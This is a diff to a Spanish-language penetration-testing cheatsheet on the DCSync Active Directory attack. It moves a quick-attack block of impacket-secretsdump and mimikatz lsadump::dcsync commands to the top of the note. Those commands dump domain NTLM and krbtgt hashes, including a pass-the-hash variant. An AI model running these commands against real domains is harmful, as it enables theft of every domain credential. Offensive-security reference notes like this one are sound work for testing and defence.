@@ -39,7 +39,30 @@ linked:
 
 ## Cheatsheet
 
-### 🔑 Permisos y Discovery
+### 1. Ataque Rápido (TL;DR)
+
+```bash
+# Standard post-DA (Linux)
+impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
+
+# Solo krbtgt
+impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt
+
+# PtH
+impacket-secretsdump -hashes :NTHASH corp.local/administrator@dc01.corp.local -just-dc-ntlm
+```
+
+```
+# Windows
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+```
+
+---
+
+### 2. Explotación
+
+#### 🔑 Permisos y Discovery
 
 ````tabs
 tab: **ACEs requeridos**
@@ -61,7 +84,7 @@ tab: **OPSEC pre-ataque**
 ![[DCSync - Permisos y Discovery#^dcsync-perms-opsec]]
 ````
 
-### 🐧 Linux Execution
+#### 🐧 Linux Execution
 
 ````tabs
 tab: **Full NT dump**
@@ -83,7 +106,7 @@ tab: **Output format**
 ![[DCSync - Linux Execution#^dcsync-linux-output]]
 ````
 
-### 🪟 Windows Execution
+#### 🪟 Windows Execution
 
 ````tabs
 tab: **mimikatz dcsync**
@@ -105,7 +128,7 @@ tab: **OPSEC**
 ![[DCSync - Windows Execution#^dcsync-win-opsec]]
 ````
 
-### ⚡ ACL Abuse (Grant DCSync)
+#### ⚡ ACL Abuse (Grant DCSync)
 
 ````tabs
 tab: **Prerequisito**
@@ -127,7 +150,7 @@ tab: **Detection de ACL change**
 ![[DCSync - ACL Abuse (Grant DCSync)#^dcsync-acl-detection]]
 ````
 
-### 🛡️ Detection & Mitigations
+#### 🛡️ Detection & Mitigations
 
 ````tabs
 tab: **Detection Events**
@@ -149,7 +172,7 @@ tab: **Bypass Notes**
 ![[DCSync - Detection y Mitigations#^dcsync-detect-bypass]]
 ````
 
-### 🛠️ Tooling
+#### 🛠️ Tooling
 
 ````tabs
 tab: **impacket-secretsdump**
@@ -217,27 +240,6 @@ Requiere dos ACEs sobre el naming context del dominio: `DS-Replication-Get-Chang
 
 5. Cleanup (si usaste ACL abuse):
    - dacledit remove / Remove-DomainObjectAcl.
-```
-
----
-
-## Detección rápida
-
-```bash
-# Standard post-DA (Linux)
-impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-ntlm
-
-# Solo krbtgt
-impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt
-
-# PtH
-impacket-secretsdump -hashes :NTHASH corp.local/administrator@dc01.corp.local -just-dc-ntlm
-```
-
-```
-# Windows
-mimikatz # privilege::debug
-mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
 ```
 
 ---
